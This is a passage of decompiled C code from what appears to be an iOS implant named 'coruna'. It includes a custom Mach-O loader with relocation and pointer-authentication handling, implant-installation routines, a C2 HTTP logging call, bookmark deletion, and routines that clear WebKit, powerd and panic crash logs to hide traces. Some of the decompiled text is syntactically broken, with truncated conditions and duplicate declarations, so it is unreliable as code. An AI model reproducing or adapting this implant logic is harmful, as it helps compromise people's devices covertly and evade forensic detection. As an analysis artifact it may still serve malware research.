  else {
    if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,0xcc108,0,0x730c4d06);
    }
    if (val != 0) goto load_ok_15;
    type_id_10 = 0xad001;
    u = 0x730c4da4;
    if ((*(char *)(arg + 0x5eb) != '\0') &&
        (buf = *(void (**)(arg + 0x5f0), buf != (void (*)0x0)) {
      (*buf)(arg,type_id_10,0,u);
    }
  }
  if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
    (**(void (**)(arg + 0x5f0))(arg,0xcc109,0,0x730c4da7);
  }
  return type_id_10;
}





uint64_t coruna_implant_via_msu_mnt1_path(long handle,long addr_2)
{
  bool err;
  uint64_t u;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    scratch = 0;
    u = coruna_msu_mnt1_path(&scratch);
    if ((int)u == 0x7003) {
      err = false;
      *(uint32_t *)(addr_2 + 4) = 0x15180;
    }
    else {
      if ((int)u != 0) {
        return u;
      }
      *(uint32_t *)(addr_2 + 4) = *(uint32_t *)(scratch + 8);
      err = *(char *)(scratch + 5) != '\0';
    }
    u = 0;
    *(bool *)addr_2 = err;
  }
  return u;
}





uint8_t *
uint64_t * coruna_implant_residual_39(int64_t arg,uint64_t val,char *path,uint64_t *id_2,int64_t *arg)
{
  uint8_t *ptr;
  long scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  uint64_t host_info;
  
  ptr = (uint8_t *)0xad001;
  if (((arg != 0) && (path != (char *)0x0)) &&
     ((*path != '\0' && id_2 != (uint64_t *)0x0) && arg != (long *)0x0)) {
    host_info = 0;
    thread_attr = 0;
    ptr = (uint8_t *)(**(void (**)(arg + 0x68))(arg,val,&host_info,&thread_attr);
    if ((int)ptr == 0) {
      bootargs = 0;
      ptr = (uint8_t *)(**(void (**)(arg + 0x50))(arg,host_info,thread_attr,&bootargs);
      if ((int)ptr == 0) {
        scratch = 0;
        ptr = (uint8_t *)(**(void (**)(arg + 0x58))(arg,bootargs,path,&scratch);
        if ((int)ptr == 0) {
          if (scratch != 0) {
            *id_2 = bootargs;
            *arg = scratch;
            return (uint8_t *)0x0;
          }
          ptr = &UNK_00004003;
        }
        (**(void (**)(arg + 0x60))(arg,bootargs);
      }
    }
  }
  return ptr;
}





uint64_t coruna_msu_mnt1_path(uint64_t *val,long handle)
{
  uint64_t u;
  uint scratch;
  int *bootargs;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) && (handle != 0)) {
    bootargs = (int *)0x0;
    scratch = 0;
    u = (**(void (**)(handle + 0x68))(handle,0x70005,&bootargs,&scratch);
    if ((int)u == 0) {
      if (bootargs == (int *)0x0) {
        u = 0xad001;
      }
      else {
        u = 0xad001;
        if (((scratch != 0) && (u = 0xad014, 0x17 < scratch)) && (*bootargs == -0x21522ff1)) {
          u = 0;
          *val = bootargs;
        }
      }
    }
  }
  return u;
}





void coruna_cleanup_crash_paths(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  coruna_chmod_dir_walk(val,"com.apple.WebKit.WebContent",0,id_2);
  coruna_chmod_dir_walk(val,"powerd",0,id_2);
  coruna_chmod_dir_walk(val,"panic",0,id_2);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_unlink_recent_in_dir(val,id_2);
  return;
}





uint coruna_pthread_attr_setdetachstate(void **ctx,void *scratch)
{
  uint u;
  int err;
  int *err;
  uint *ptr;
  void *scratch;
  pthread_t bootargs;
  pthread_attr_t thread_attr;
  
  thread_attr.__opaque[0x20] = '\0';
  thread_attr.__opaque[0x21] = '\0';
  thread_attr.__opaque[0x22] = '\0';
  thread_attr.__opaque[0x23] = '\0';
  thread_attr.__opaque[0x24] = '\0';
  thread_attr.__opaque[0x25] = '\0';
  thread_attr.__opaque[0x26] = '\0';
  thread_attr.__opaque[0x27] = '\0';
  thread_attr.__opaque[0x18] = '\0';
  thread_attr.__opaque[0x19] = '\0';
  thread_attr.__opaque[0x1a] = '\0';
  thread_attr.__opaque[0x1b] = '\0';
  thread_attr.__opaque[0x1c] = '\0';
  thread_attr.__opaque[0x1d] = '\0';
  thread_attr.__opaque[0x1e] = '\0';
  thread_attr.__opaque[0x1f] = '\0';
  thread_attr.__opaque[0x30] = '\0';
  thread_attr.__opaque[0x31] = '\0';
  thread_attr.__opaque[0x32] = '\0';
  thread_attr.__opaque[0x33] = '\0';
  thread_attr.__opaque[0x34] = '\0';
  thread_attr.__opaque[0x35] = '\0';
  thread_attr.__opaque[0x36] = '\0';
  thread_attr.__opaque[0x37] = '\0';
  thread_attr.__opaque[0x28] = '\0';
  thread_attr.__opaque[0x29] = '\0';
  thread_attr.__opaque[0x2a] = '\0';
  thread_attr.__opaque[0x2b] = '\0';
  thread_attr.__opaque[0x2c] = '\0';
  thread_attr.__opaque[0x2d] = '\0';
  thread_attr.__opaque[0x2e] = '\0';
  thread_attr.__opaque[0x2f] = '\0';
  thread_attr.__opaque[0] = '\0';
  thread_attr.__opaque[1] = '\0';
  thread_attr.__opaque[2] = '\0';
  thread_attr.__opaque[3] = '\0';
  thread_attr.__opaque[4] = '\0';
  thread_attr.__opaque[5] = '\0';
  thread_attr.__opaque[6] = '\0';
  thread_attr.__opaque[7] = '\0';
  thread_attr.__sig = 0;
  thread_attr.__opaque[0x10] = '\0';
  thread_attr.__opaque[0x11] = '\0';
  thread_attr.__opaque[0x12] = '\0';
  thread_attr.__opaque[0x13] = '\0';
  thread_attr.__opaque[0x14] = '\0';
  thread_attr.__opaque[0x15] = '\0';
  thread_attr.__opaque[0x16] = '\0';
  thread_attr.__opaque[0x17] = '\0';
  thread_attr.__opaque[8] = '\0';
  thread_attr.__opaque[9] = '\0';
  thread_attr.__opaque[10] = '\0';
  thread_attr.__opaque[0xb] = '\0';
  thread_attr.__opaque[0xc] = '\0';
  thread_attr.__opaque[0xd] = '\0';
  thread_attr.__opaque[0xe] = '\0';
  thread_attr.__opaque[0xf] = '\0';
  bootargs = (pthread_t)0x0;
  if (ctx == (void **)0x0) {
    return 0xad001;
  }
  err = _pthread_attr_init(&thread_attr);
  if (err != 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    return u | 0x40000000;
  }
  err = _pthread_attr_setdetachstate(&thread_attr,1);
  if ((err == 0) && (err = _pthread_create(&bootargs,&thread_attr,ctx,scratch), err == 0)) {
    scratch = (void *)0x0;
    err = _pthread_join(bootargs,&scratch);
    if (err == 0) {
      u = (uint)scratch;
      _pthread_attr_destroy(&thread_attr);
      return u;
    }
  }
  err = ___error();
  err = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < err) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  _pthread_attr_destroy(&thread_attr);
  return u;
}





uint64_t coruna_webbookmarks_delete_wrapper(void)
{
  coruna_webbookmarks_delete();
  return 0;
}





uint64_t coruna_call_webbookmarks_delete(void)
{
  coruna_webbookmarks_delete();
  return 0;
}





uint64_t coruna_implant_via_cat(long handle,long addr_2,long off_3)
{
  uint u;
  uint64_t size;
  uint32_t scratch;
  uint32_t bootargs;
  long thread_attr;
  
  size = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    if ((*(int *)(addr_2 + 0xd8) == 0x100000c) && (1 < *(uint *)(addr_2 + 0xdc))) {
      thread_attr = off_3;
      if ((off_3 != 0) ||
         (size = (**(void (**)(handle + 0x70))(handle,0,&thread_attr), (int)size == 0)) {
        scratch = *(uint32_t *)k_implant_mach_task_self_slot;
        bootargs = 0;
        size = (**(void (**)(handle + 0x78))(handle,thread_attr,0xc000001b,&scratch);
        if ((int)size == 0) {
          u = bootargs >> 0x18;
          bootargs = bootargs & 0xffffff00;
          if (k_implant_rodata_word_26a08 <= *(double *)k_implant_dyldversionnumber_slot) {
            bootargs = coruna_cat(1,(uint16_t)bootargs);
            bootargs = coruna_cat((char)u,(uint32_t)bootargs);
          }
          size = (**(void (**)(handle + 0x78))(handle,thread_attr,0x4000001b,&scratch);
        }
        if (off_3 == 0) {
          (**(void (**)(handle + 0x90))(handle,thread_attr);
        }
      }
    }
    else {
      size = 0;
    }
  }
  return size;
}





void coruna_log_msg(char *path,uint64_t val,uint64_t id_2)
{
  if ((((path != (char *)0x0) && (*path != '\0')) && (*(long *)(path + 0x10) != 0)) &&
     (*(long *)(path + 8) != 0)) {
    coruna_c2_http_json(*(long *)(path + 0x10),*(long *)(path + 8),val,0,id_2);
    return;
  }
  return;
}





long coruna_call_log_msg(uint64_t *val)
{
  int err;
  char *ptr;
  
  ptr = (char *)val[2];
  if ((ptr != (char *)0x0) && (*ptr != '\0')) {
    coruna_log_msg(ptr,0xcc10d,0x730c4d88);
  }
  err = (*(void (*)val[1])(*val);
  return (long)err;
}





uint8_t * coruna_init_libsystem(uint64_t *val,int *flags,uint size,uint64_t *id_2)
{
  unsigned long u;
  uint64_t *ptr;
  byte *ptr;
  uint *buf;
  uint *str;
  unsigned long *copy;
  unsigned long *data;
  unsigned long *obj;
  uint32_t size;
  char *ptr;
  ushort version;
  ushort port;
  uint tag;
  bool err;
  bool status;
  int err;
  uint kind;
  long *buf;
  unsigned long type_id;
  long handle;
  uint8_t *block;
  long *str;
  uint8_t *entry;
  void (*buf)(void);
  void (*str)(void);
  void (*copy)(void);
  void (*data)(void);
  void (*obj)(void);
  byte flags;
  uint type_id_8;
  uint type_id_9;
  uint32_t type_id_10;
  long *copy;
  uint *entry_9;
  uint *entry_10;
  int *err;
  byte *data;
  int *status;
  unsigned long *entry_11;
  long addr;
  long *obj;
  unsigned long *entry_12;
  unsigned long type_id_11;
  int *flags;
  unsigned long type_id_12;
  long off;
  uint type_id_13;
  long base;
  uint *entry_13;
  long ctx_val;
  uint8_t *entry_14;
  long serial;
  unsigned long type_id_14;
  int *count;
  byte *block;
  byte *entry;
  unsigned long type_id_15;
  uint64_t type_id_16;
  int *scratch;
  long *bootargs;
  unsigned long *thread_attr;
  long host_info [64];
  uint serial_buf;
  void (*action)(void);
  void (*block_ctx)(void);
  long stack_guard;
  void (*sa_saved)(void);
  uint *sa_new;
  long path_buf [3];
  unsigned long tmp_buf;
  long region [2];
  
  coruna_copy_bytes_cc70(host_info,0x208);
  if (val == (uint64_t *)0x0) {
    return &k_implant_rodata_word_12002;
  }
  if (((val[5] == 0 || id_2 == (uint64_t *)0x0) || flags == (int *)0x0) || size == 0)
  {
    return &k_implant_rodata_word_12002;
  }
  buf = (long *)coruna_implant_via_driver_copy_port_1918_2(val,0x120,0);
  if (buf == (long *)0x0) {
    return &k_implant_rodata_word_12002;
  }
  type_id_15 = (unsigned long)size;
  coruna_copy_bytes_cc70(buf,0x120);
  buf[0xd] = (long)flags;
  buf[0x14] = type_id_15;
  type_id_14 = val[2];
  if (type_id_14 == 0) {
    type_id_8 = 0xff;
  }
  else {
    err = (int *)(type_id_14 & 0xfffffffffffff000);
    do {
      count = err;
      err = count + -0x400;
    } while (*count != -0x1120531);
    type_id_8 = count[2] & 0xffffff;
  }
  bootargs = (long *)flags;
  if (*flags == -0x35014542 || *flags == -0x41450136) {
    type_id_9 = flags[1];
    if (type_id_9 == 0) {
fail:
      return &k_implant_rodata_word_12006;
    }
    bootargs = (long *)0x0;
    kind = 0;
    type_id_13 = 0;
    err = (int *)((long)flags + type_id_15);
    type_id_9 = (type_id_9 & 0xff00ff00) >> 8 | (type_id_9 & 0xff00ff) << 8;
    type_id_9 = type_id_9 >> 0x10 | type_id_9 << 0x10;
    if (type_id_9 < 2) {
      type_id_9 = 1;
    }
    type_id_15 = 0;
    do {
      type_id = coruna_nop_stub(0x14,kind);
      count = (int *)((long)flags + (type_id & 0xffffffff) + 8);
      if (count < flags || err <= count) {
        return &k_implant_rodata_word_12004;
      }
      if ((int *)((long)count + 0x13U) < flags || err <= (int *)((long)count + 0x13U)) {
        return &k_implant_rodata_word_12004;
      }
      tag = (count[2] & 0xff00ff00U) >> 8 | (count[2] & 0xff00ffU) << 8;
      tag = tag >> 0x10 | tag << 0x10;
      if (size <= tag) {
        return &k_implant_rodata_word_12005;
      }
      status = (int *)((long)flags + (unsigned long)tag);
      tag = (count[3] & 0xff00ff00U) >> 8 | (count[3] & 0xff00ffU) << 8;
      type_id = (unsigned long)(tag >> 0x10 | tag << 0x10);
      flags = (int *)((long)status + (type_id - 1));
      if (flags < flags || err <= flags) {
        return &k_implant_rodata_word_12005;
      }
      if ((*count == 0xc000001) &&
         (tag = (count[1] & 0xff00ff00U) >> 8,
         tag = (tag | (count[1] & 0xff0000U) << 8) >> 0x10 | tag << 0x10,
         tag <= type_id_8 && type_id_13 <= tag)) {
        type_id_15 = type_id;
        bootargs = (long *)status;
        type_id_13 = tag;
      }
      kind = kind + 1;
    } while (type_id_9 != kind);
    return &k_implant_rodata_word_12006;
  }
  if (type_id_15 < 0x20) {
    return (uint8_t *)0x13001;
  }
  if (*(int *)bootargs != -0x1120531) {
    return (uint8_t *)0x13002;
  }
  err = 0x13005;
  if (type_id_15 < (unsigned long)*(uint *)((long)bootargs + 0x14) + 0x20) {
    return (uint8_t *)0x13003;
  }
  if ((type_id_14 == 0) && (*(int *)((long)bootargs + 0xc) != 7)) {
done:
    return (uint8_t *)(unsigned long)(err + 1);
  }
  if (*(int *)((long)bootargs + 4) != 0x100000c) {
cleanup:
    return (uint8_t *)(unsigned long)(err - 1);
  }
  type_id_9 = *(uint *)((long)bootargs + 8) & 0xffffff;
  if (type_id_8 < type_id_9) {
    type_id_8 = 0x3005;
    return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
  }
  if (type_id_9 == 2) {
    flags = *(byte *)((long)buf + 0xac) | 0x40;
    *(byte *)((long)buf + 0xac) = flags;
  }
  else {
    if (type_id_9 < 2) {
      return (uint8_t *)0x13005;
    }
    flags = *(byte *)((long)buf + 0xac);
  }
  *(byte *)((long)buf + 0xac) = *(byte *)((long)bootargs + 0x18) >> 2 & 8 | flags & 0xf7;
  *buf = (long)bootargs;
  err = *(int *)((long)bootargs + 0x10);
  if (err == 0) {
    type_id_14 = 0;
    base = 0;
  }
  else {
    base = 0;
    type_id_14 = 0;
    err = (int *)((long)bootargs + 0x20);
    do {
      if (err < bootargs) {
        return (uint8_t *)0x14001;
      }
      if ((int *)((long)bootargs + type_id_15) <= err) {
        return (uint8_t *)0x14001;
      }
      if (*err == 0x19) {
        type_id = *(unsigned long *)(err + 8);
        if (CARRY8(type_id_14,type_id)) {
          return (uint8_t *)0x14002;
        }
        if ((*(long *)(err + 10) == 0) && (*(long *)(err + 0xc) != 0)) {
          if (base != 0) {
            return (uint8_t *)0x14003;
          }
          base = *(long *)(err + 6);
        }
        if (0xfffffffe < type_id) {
          type_id = 0;
        }
        type_id_14 = type_id + type_id_14;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  handle = coruna_implant_via_driver_copy_port_1918_2(val,type_id_14,1);
  if (handle == -1) {
    return (uint8_t *)0x14004;
  }
  buf[10] = base;
  buf[0xb] = handle;
  *(int *)(buf + 0x15) = (int)type_id_14;
  if ((val[0xba] != 0) && (val[0xbb] != 0)) {
    handle = val[0xba] + (handle - val[0xbb]);
  }
  buf[0xc] = handle;
  base = *buf;
  if (*(int *)(base + 0x10) != 0) {
    if (buf[0x14] < 0x21) {
      return (uint8_t *)0x14009;
    }
    type_id_8 = 0;
    err = (int *)(buf[0xd] + 0x20);
    do {
      err = *err;
      if (err < 0xf) {
        if (err < 2) {
          if (err == -0x7fffffde) {
skip:
            buf[4] = (long)err;
          }
          else if (err == -0x7fffffcc) {
            *(byte *)((long)buf + 0xac) = *(byte *)((long)buf + 0xac) | 0x40;
            buf[5] = (long)err;
          }
        }
        else if (err == 2) {
          buf[6] = (long)err;
        }
        else if (err == 0xd) {
          buf[3] = (long)err;
        }
      }
      else if (err < 0x1a) {
        if (err == 0xf) {
          flags = *(byte *)((long)buf + 0xac) | 0x10;
next:
          *(byte *)((long)buf + 0xac) = flags;
        }
        else if (err == 0x19) {
          count = err + 2;
          err = coruna_implant_residual_41(count,"__PAGEZERO");
          if (err != 0) {
            err = coruna_implant_residual_41(count,"__TEXT");
            if (err == 0) {
              err = false;
              status = true;
            }
            else {
              err = coruna_implant_residual_41(count,"__DATA");
              if (err == 0) {
                status = false;
                err = true;
              }
              else {
                err = coruna_implant_residual_41(count,"__LINKEDIT");
                if (err == 0) {
                  status = false;
                  err = false;
                  buf[1] = ((buf[0xb] - buf[10]) + *(long *)(err + 6)) -
                               *(long *)(err + 10);
                }
                else {
                  status = false;
                  err = false;
                }
              }
            }
            type_id_15 = buf[0xb];
            type_id_14 = *(unsigned long *)(err + 0xc);
            base = 0;
            if (type_id_14 != 0) {
              base = type_id_14 - 1;
            }
            if (type_id_15 != 0) {
              type_id = *(unsigned long *)(err + 8);
              if ((((-1 < (long)type_id) && (type_id_14 <= type_id)) &&
                  (handle = *(long *)(err + 10), -1 < handle)) && (handle < buf[0x14])) {
                type_id_12 = buf[0xd];
                type_id_11 = type_id_12 + handle + base;
                if ((((type_id_12 <= type_id_11) && (type_id_11 < type_id_12 + buf[0x14])) &&
                    ((type_id_11 = *(long *)(err + 6) + (type_id_15 - buf[10]), type_id_15 <= type_id_11 &&
                     ((type_id_11 < type_id_15 + *(uint *)(buf + 0x15) &&
                      (u = (type_id_11 - 1) + type_id, type_id_15 <= u)))))) &&
                   (u < type_id_15 + *(uint *)(buf + 0x15))) {
                  err = coruna_driver_copy_port_1918(val,type_id_11,type_id,3);
                  if (err == 0) {
                    coruna_dyld_cached_port_ptr(type_id_11,type_id_12 + handle,type_id_14);
                    coruna_copy_bytes_cc70(type_id_11 + type_id_14,type_id - type_id_14);
                    if (err[0x10] != 0) {
                      type_id_9 = 0;
                      do {
                        type_id_15 = coruna_nop_stub(0x50,type_id_9);
                        type_id_15 = (long)err + (type_id_15 & 0xffffffff) + 0x48;
                        if (type_id_15 < (unsigned long)buf[0xd] ||
                            (unsigned long)(buf[0xd] + buf[0x14]) <= type_id_15) {
                          return (uint8_t *)0x1400a;
                        }
                        if (*(char *)(type_id_15 + 0x40) == '\n') {
                          flags = *(byte *)((long)buf + 0xac) | 2;
retry:
                          *(byte *)((long)buf + 0xac) = flags;
                        }
                        else {
                          if (*(char *)(type_id_15 + 0x40) == '\t') {
                            flags = *(byte *)((long)buf + 0xac) | 1;
                            continue;
                          }
                          if (status) {
                            err = coruna_implant_residual_41(type_id_15,"__eh_frame");
                            if (err == 0) {
                              *(int *)(buf + 0x16) = (int)type_id_15 - (int)err;
                            }
                            else {
                              err = coruna_implant_residual_41(type_id_15,"__unwind_info");
                              if (err == 0) {
                                *(int *)((long)buf + 0xb4) = (int)type_id_15 - (int)err;
                              }
                              else {
                                err = coruna_implant_residual_41(type_id_15,"__x");
                                if (err == 0) {
                                  buf[0x1d] =
                                       (buf[0xb] - buf[10]) + *(long *)(type_id_15 + 0x20);
                                }
                                else {
                                  err = coruna_implant_residual_41(type_id_15,"__stubs");
                                  if (err == 0) {
                                    buf[0x1e] =
                                         (buf[0xb] - buf[10]) + *(long *)(type_id_15 + 0x20);
                                    buf[0x1f] = *(long *)(type_id_15 + 0x28);
                                  }
                                  else {
                                    err = coruna_implant_residual_41(type_id_15,"__auth_stubs");
                                    if (err == 0) {
                                      buf[0x20] =
                                           (buf[0xb] - buf[10]) + *(long *)(type_id_15 + 0x20);
                                      buf[0x21] = *(long *)(type_id_15 + 0x28);
                                    }
                                    else {
                                      err = coruna_implant_residual_41(type_id_15,"__objc_stubs");
                                      if (err == 0) {
                                        buf[0x22] =
                                             (buf[0xb] - buf[10]) + *(long *)(type_id_15 + 0x20)
                                        ;
                                        buf[0x23] = *(long *)(type_id_15 + 0x28);
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                          else if ((err) &&
                                  (err = coruna_implant_residual_41(type_id_15,"__internal"), err == 0)) {
                            flags = *(byte *)((long)buf + 0xac) | 0x20;
                            continue;
                          }
                        }
                        type_id_9 = type_id_9 + 1;
                      } while (type_id_9 < (uint)err[0x10]);
                    }
                    goto found;
                  }
                  err = 0x14007;
                  return (uint8_t *)(unsigned long)(err + 1);
                }
              }
              type_id_8 = 0x4007;
              return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
            }
            err = 0x14007;
            return (uint8_t *)(unsigned long)(err - 1);
          }
        }
      }
      else {
        if (err == 0x1a) {
          *(byte *)((long)buf + 0xac) = *(byte *)((long)buf + 0xac) | 4;
        }
        else if (err == 0x22) {
          buf[4] = (long)err;
        }
      }
found:
      type_id_8 = type_id_8 + 1;
      base = *buf;
      if (*(uint *)(base + 0x10) <= type_id_8) {
        err = (int *)buf[0xd];
        serial_buf = 0;
        if (*(uint *)(base + 0x10) == 0) {
          break;
        }
        if (buf[0x14] < 0x21) {
          return (uint8_t *)0x17001;
        }
        type_id_8 = 0;
        status = (int *)((long)err + buf[0x14]);
        count = err + 8;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      if (err < (int *)buf[0xd]) {
        return (uint8_t *)0x14009;
      }
      if ((int *)(buf[0xd] + buf[0x14]) <= err) {
        return (uint8_t *)0x14009;
      }
    } while( true );
  }
  serial_buf = 0;
nomem:
  thread_attr = (unsigned long *)(buf + 7);
  bootargs = buf + 0xf;
  handle = buf[5];
  if ((handle == 0) || (*(int *)(handle + 8) == 0)) {
    handle = buf[4];
    if ((handle == 0) || (*(int *)(handle + 0x10) == 0)) {
      block = (uint8_t *)0xad001;
      handle = buf[1];
      if ((((handle == 0) || (addr = buf[8], addr == 0)) ||
          (entry_13 = (uint *)buf[0xb], entry_13 == (uint *)0x0)) || (*thread_attr == 0)) {
        entry = (uint8_t *)0xad001;
        *id_2 = buf;
        return entry;
      }
      off = buf[0xc];
      ctx_val = buf[10];
      serial = coruna_implant_residual_44();
      if (*(uint *)(addr + 0x4c) != 0) {
        entry_9 = (uint *)(handle + (unsigned long)*(uint *)(addr + 0x48));
        str = entry_9 + (unsigned long)*(uint *)(addr + 0x4c) * 2;
        entry = (uint8_t *)0x1000;
        if (((str <= entry_9) || (entry_9 < entry_13)) ||
           (entry_10 = (uint *)((long)entry_13 + (unsigned long)*(uint *)(buf + 0x15)), entry_10 <= entry_9
           *id_2 = buf;
           return entry;
      }
      sa_new = (uint *)0x0;
      type_id_8 = *(uint *)(addr + 0x44);
      if (0 < (int)type_id_8) {
        entry_9 = (uint *)(handle + (unsigned long)*(uint *)(addr + 0x40));
        if (entry_9 < entry_9 + (unsigned long)type_id_8 * 2) {
          entry = (uint8_t *)0x1000;
          if ((entry_9 < entry_13) ||
             (str = (uint *)((long)entry_13 + (unsigned long)*(uint *)(buf + 0x15)), str <= entry_9
             *id_2 = buf;
             return entry;
        }
        entry = (uint8_t *)0x1000;
        *id_2 = buf;
        return entry;
      }
load_ok:
      sa_new = (uint *)0x0;
      if ((((buf[0xd] != 0) && (buf[1] != 0)) && (base = buf[8], base != 0)) &&
         ((buf[0xb] != 0 && (*thread_attr != 0)))) {
        handle = *buf;
        if (*(int *)(handle + 0x10) == 0) {
          block = (uint8_t *)0x0;
        }
        else {
          type_id_8 = 0;
          scratch = (int *)(buf[0xd] + 0x20);
          base = buf[1] + (unsigned long)*(uint *)(base + 0x38);
          addr = buf[0xc];
          serial = buf[10];
          do {
            if (*scratch == 0x19) {
              err = scratch + 0x12;
              count = err + (unsigned long)(uint)scratch[0x10] * 0x14;
              if (count <= err) goto load_ok_15;
              entry = (uint8_t *)0x0;
              do {
                type_id_9 = err[0x10];
                kind = coruna_implant_residual_42(err[10]);
                block = entry;
                if ((type_id_9 & 0xfe) == 6 && kind != 0) {
                  type_id = (unsigned long)(uint)err[0x11];
                  type_id_15 = base + type_id * 4;
                  type_id_14 = buf[0xb];
                  block = (uint8_t *)0x910005;
                  if ((type_id_14 <= type_id_15 && type_id_15 < type_id_14 + *(uint *)(buf + 0x15)) &&
                     (type_id_15 = base + (unsigned long)((kind + err[0x11]) - 1) * 4,
                     type_id_14 <= type_id_15 && type_id_15 < type_id_14 + *(uint *)(buf + 0x15))) {
                    str = (long *)(*(long *)(err + 8) + (addr - serial));
                    type_id_15 = (unsigned long)kind;
                    do {
                      type_id_9 = *(uint *)(base + type_id * 4);
                      if (type_id_9 != 0x40000000) {
                        if (type_id_9 == 0x80000000) {
                          entry_13 = (uint *)(*str + (addr - serial));
load_ok_16:
                          *str = (long)entry_13;
                        }
                        else {
                          type_id_14 = *thread_attr + (unsigned long)type_id_9 * 0x10;
                          type_id_11 = buf[0xb];
                          if ((type_id_14 >= type_id_11 && type_id_14 <= type_id_11 + *(uint *)(buf + 0x15)) &&
                              (type_id_14 < type_id_11 || type_id_11 + *(uint *)(buf + 0x15) != type_id_14)) {
                            err = coruna_return_zero_ead4(buf,type_id_14,&sa_new,host_info,val);
                            entry_13 = sa_new;
                            if (err != 0) goto load_ok_16;
                            entry = (uint8_t *)0x910003;
                          }
                          else {
                            entry = (uint8_t *)0x910004;
                          }
                        }
                      }
                      str = str + 1;
                      type_id = (unsigned long)((int)type_id + 1);
                      type_id_15 = type_id_15 - 1;
                      block = entry;
                    } while (type_id_15 != 0);
                  }
                }
                err = err + 0x14;
                entry = block;
              } while (err < count);
              handle = *buf;
            }
            else {
load_ok_15:
              block = (uint8_t *)0x0;
            }
            scratch = (int *)((long)scratch + (unsigned long)(uint)scratch[1]);
            type_id_8 = type_id_8 + 1;
          } while (type_id_8 < *(uint *)(handle + 0x10) && (int)block == 0);
        }
      }
    }
    else {
      if ((*(byte *)((long)buf + 0xac) >> 6 & 1) == 0) {
        entry = (uint8_t *)0x930003;
        addr = buf[0xc];
        serial = buf[10];
        base = buf[1];
        type_id_8 = *(uint *)(handle + 8);
        type_id_9 = *(uint *)(handle + 0xc);
        str = (long *)coruna_implant_residual_43(0);
        if (str == (long *)0x0) {
load_ok_17:
          entry = (uint8_t *)0x930004;
          *id_2 = buf;
          return entry;
        }
        if (type_id_9 != 0) {
          addr = addr - serial;
          entry = (byte *)(base + (unsigned long)type_id_8);
          ptr = entry + type_id_9;
          type_id_8 = 1;
          do {
            block = entry + 1;
            flags = *entry;
            copy = str;
            entry = block;
            if (flags >> 4 < 9) {
              type_id_9 = flags & 0xf;
              err = (int)addr;
              switch(flags >> 4) {
              default:
                entry = (uint8_t *)coruna_implant_via_copy_bytes_cc70(0,buf,host_info,val);
                *id_2 = buf;
                return entry;
              }
            }
load_ok_19:
            str = copy;
          } while (entry < ptr);
        }
load_ok_18:
        entry = (uint8_t *)coruna_implant_via_copy_bytes_cc70(0,buf,host_info,val);
        *id_2 = buf;
        return entry;
      }
      else {
        type_id_16 = 0;
      }
      block = (uint8_t *)coruna_implant_via_copy_bytes_cc70(type_id_16,buf,host_info,val);
    }
  }
  else {
    entry = (uint8_t *)0xad008;
    if (((*(byte *)((long)buf + 0xac) >> 6 & 1) == 0) ||
       *id_2 = buf;
       return entry;
  }
  entry = block;
  if (((int)block != 0) ||
     *id_2 = buf;
     return entry;
}





uint8_t * coruna_implant08_via_return_zero(uint64_t val,long *handle,long addr_2,unsigned long *arg)
{
  unsigned long u;
  int err;
  long handle;
  long addr;
  int *err;
  int *status;
  long *ptr;
  unsigned long size;
  
  if (addr_2 == 0) {
    return (uint8_t *)0xad001;
  }
  if (arg == (unsigned long *)0x0) {
    return (uint8_t *)0xad001;
  }
  if (handle == (long *)0x0) {
    return (uint8_t *)0xad001;
  }
  addr = handle[7];
  if (addr == 0) {
    return (uint8_t *)0xad001;
  }
  if (handle[9] == 0) {
    return (uint8_t *)0xad001;
  }
  *arg = 0;
  handle = handle[6];
  if (*(int *)(handle + 0xc) == 0) {
    return &k_implant_rodata_word_12001;
  }
  size = 0;
  ptr = (long *)(addr + 8);
  do {
    if ((*(byte *)((long)ptr + -4) & 0xe1) == 1) {
      err = coruna_implant_residual_41(addr_2,handle[9] + (unsigned long)*(uint *)(ptr + -1));
      if (err == 0) {
        size = (handle[0xc] - handle[10]) + *ptr;
        *arg = size;
        err = *(int *)(*handle + 0x10);
        if (err != 0) {
          status = (int *)(handle[0xd] + 0x20);
          while (((*status != 0x19 ||
                  (u = *(long *)(status + 6) + (handle[0xc] - handle[10]), size < u)) ||
                 (*(long *)(status + 8) + u <= size))) {
            status = (int *)((long)status + (unsigned long)(uint)status[1]);
            err = err + -1;
            if (err == 0) {
              return (uint8_t *)0x0;
            }
          }
          err = status + 0x12;
          status = err + (unsigned long)(uint)status[0x10] * 0x14;
          if (err < status) {
            while ((u = *(long *)(err + 8) + (handle[0xc] - handle[10]), size < u ||
                   (*(long *)(err + 10) + u <= size))) {
              err = err + 0x14;
              if (status <= err) {
                return (uint8_t *)0x0;
              }
            }
            if ((err[0x10] & 0x80000400U) != 0) {
              err = coruna_return_zero();
              if (err != 0) {
                size = coruna_pacia(size,0);
              }
              *arg = size;
              return (uint8_t *)0x0;
            }
          }
        }
        return (uint8_t *)0x0;
      }
      handle = handle[6];
    }
    size = size + 1;
    ptr = ptr + 2;
  } while (size < *(uint *)(handle + 0xc));
  return &k_implant_rodata_word_12001;
}





uint8_t * coruna_implant08_via_driver_copy_port_1918(long handle,long *addr_2)
{
  long handle;
  long addr;
  byte err;
  int err;
  long off;
  long base;
  void (*ptr)(void);
  uint8_t *ptr;
  uint u;
  int *err;
  int *status;
  int *flags;
  
  err = *(byte *)((long)addr_2 + 0xac);
  if (-1 < (char)err) {
    if ((((err >> 4 & 1) == 0) && ((err >> 1 & 1) != 0)) &&
